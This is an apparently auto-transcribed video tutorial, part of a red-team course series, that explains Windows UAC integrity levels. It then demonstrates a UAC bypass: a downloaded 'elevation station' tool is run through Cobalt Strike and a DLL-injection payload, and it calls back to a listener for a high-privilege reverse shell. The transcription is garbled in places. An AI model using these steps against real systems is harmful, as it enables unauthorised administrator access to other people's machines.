hey guys welcome to another video so we are in the one of the important section it's a privilege
escalation so if you coming about the privilege escalation so the privilege escalation is like
we are in user privilege but we need to execute we need to do more stuff to do that you need
to jump out to that administrator level right administrator or a system level of privilege okay
so if you are in a if you are in a some user level privilege you you could not have enough access to
get the things sorted okay the first point let me show you a few things with an example
let me open my command code in a normal way and I will give this command let me execute this
you can see I just this is a command to enable the already remote desktop connection okay
so now it was saying mirror access is denied because I do not have enough access because I was
in a normal privilege so you can see I have a medium mandatory level privilege but I am in a local
administrator and member of administrator okay so I was in the administrator group but my privilege
was a medium just a user privilege so I could not able to modify the registry or creating any
persistence so we should sign anything okay so let me open the command prompt in administrator mode
I will open this administrator mode and I will execute this command so now you can see the
operation has been completed successfully okay because we are in administrator level privilege
so here you can find the difference between both of the user and administrator privilege
so let me let me we will see this okay here you can see the high mandatory level it's an
administrator level and anyway the member is part of an administrator group he is the user
and both are the similar user okay so windows has been any if you take the windows 10 windows
now or any of any windows based machines so the windows created a separate function called
the UAC okay UAC means to say user access control when I you see MD and if I right click on if
if you right click so it was asking one terminal right those asking one permission so you can
see here user account control okay so if I click on the else it will load my terminal as
administrator level okay so the windows manufacturer they created this for a security reason
because when you downloading any malicious file from the internet so if you executing that file
so directly that if the UAC if the windows do not support the UAC futures so when you are executing
any file it will be executed under the administrator rights right so the malware can able to
get more access comparing to the medium and it will so they they split to the privilege medium
mandatory level high mandatory level and all so if you needs to go to the administrator level
you have to click on if you if you any any application okay let me take a task manager
and as an administrator okay so for any application use the the windows will ask you whether this
program can be opened in administrator mode or it's okay with the normal mode okay so when you
double click on any of the application it will be normally loaded as a medium mandatory level as a
user level but if you right click on this and run as an administrator it will run as an administrator
level okay so this is the difference between both of the both of the console here you can find
some information it's a privilege of information so here you can see we have only a less
privilege but here you can here you can find a lot and a lot of options when comparing to the
medium mandatory level so if you need to execute any commands any sort of things if you need
to perform any kind of big operation in the windows operating system you need to be in
administrator level of privilege right so let me do let me give you one more example I'll be
opening this process explorer as a runner sir administrator let me show you some interesting part
let me filter it the CMD so we know there is a two CMD has been opened one is a normal
and one is administrator mode let me click on the properties and here you can here you can find
built in administrator it's then you flag and let me go through another CMD and let me
you you show you that but here you can find it's administrator mode command prompt so it was showing
the built in administrator is a owner of that and built in administrator it's a denny okay
so that you can find the 85252 this one it's a normal medium mandatory level user level command
prompt and this administrator level command prompt okay so if you want to do some privilege
escalation so in the simple way you can go and bypass the USA so we know this user already
has a this already in a this user was already in a part of the local administrator group right
he's already in a local administrator group so you can easily elevate the privilege elevate
the user access account control policy okay so the by mean this one okay you can simply elevate
elevate this okay so I was using one of the tool called elevation station dot EXE for this
that was a simple tool you can easily get it from a Google so let me tell you how to get that
so click on this and go to the elevation station this one so go to the elevation station dot EXE
click on this and download the file okay that's all you need you don't need to do any any other
things to perform this operation okay let me I have already downloaded and I saved it
saved that as elevation so this is my file let me open the okay we will go we will go by one by one
I will show you how to get on to this we are in the cobalt strike let's execute our normal
payload which we have created on before
we will get turned to interacts interact session
you can execute you can execute this payload in a many ways okay you can go for a
dealer injection and you can execute from there you can put the elevation station in the
colony machine and you can approach it in the into the window station so that belongs to you
maybe we complete a lot of sections you will be having a different set of ideas to how to deliver
this elevation station into the window machine so I will be using download I am not
uploading or anything I will just directly executing that let me check which folder we are in
because of a railway station elevation station it was in the download folder as a name
as a elevation we will use that so we are in the C users user folder let me go to
download folders so we will wait for some time let the program we will get executed
let me open any other port if you you can open any port I will be opening L E P 867 8 this
support which I am opening so that's completely belongs to you elevation so this is our tool name
UAC dash UAC okay they need to give you the local host 192 and 6k dot 18 dot 27
and you have to give the port here the port which we have opened it says 8678 so let me give
the port here 8678 let me execute this okay so we need to give the shell command before
because we are executing in a CMD right so shell elevation dash UAC 8678 let we will see
whether we will getting the reverse connection or not
we need to wait for a few seconds it will take some time
we you can see I got a reverse connection so if I check the privilege now
who am I slash all so here you can find we are in a high mandatory level you can you can do
any anything from this privilege right so this is the way you can easily bypass the
user access control okay I have used to cobalt sake if you need you can go to another way let me
cancel this and I will be opening the similar port this time we will execute the
DRL injection which we have created before
we got a session I feel it was in a admin okay it's in a medium mandatory level so no problem
let's re-direct to see our usual plus user dash downloads
so elevation dash UAC 192.168.18.27 you need to give the calling machine IP and wait 567
so this is the port which I am using for that time I will be opening a new port
a cat L D T 8 567 8 567 yeah let's execute the payload
may execute this one more time it was not completed I didn't get the 8 5 8 567 and I didn't get the
reverse connection from that port I feel the connection will be dominated by SIE unfortunately
I have deleted that so no problem we already know how to deliver this payload and how to
do the privilege installation we will pop off the video and we will continue our decision
next video see you guys for one